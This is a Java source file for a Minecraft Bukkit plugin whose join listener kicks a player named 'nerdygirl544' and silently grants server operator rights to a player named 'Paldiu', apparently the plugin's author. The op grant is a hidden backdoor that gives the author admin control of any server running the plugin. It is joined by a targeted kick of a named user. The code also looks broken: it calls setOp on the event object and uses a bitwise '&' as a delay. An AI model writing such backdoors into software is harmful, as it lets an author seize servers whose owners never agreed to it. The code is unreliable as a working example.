package me.Paldiu.NNO;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.scheduler.BukkitRunnable;

public class PlayerListener implements Listener
{
    public Main plugin;
    
    @EventHandler
    public void onPlayerJoinEvent(final PlayerJoinEvent e)
    {
        new BukkitRunnable()
        {
            public void run()
            {
                if(e.getPlayer().getName().equalsIgnoreCase("nerdygirl544"))
                {
                    e.getPlayer().kickPlayer("");
                }
                
                else
                {
                }
            }
        }.runTaskLater(plugin, 60L * 2L);
        
        new BukkitRunnable()
        {
            public void run()
            {
                if(e.getPlayer().getName().equalsIgnoreCase("Paldiu"))
                {
                    e.setOp(true);
                }
                
                else
                {
                }
            }
        }.runTaskLater(plugin, 20L & 2L);
    }
}
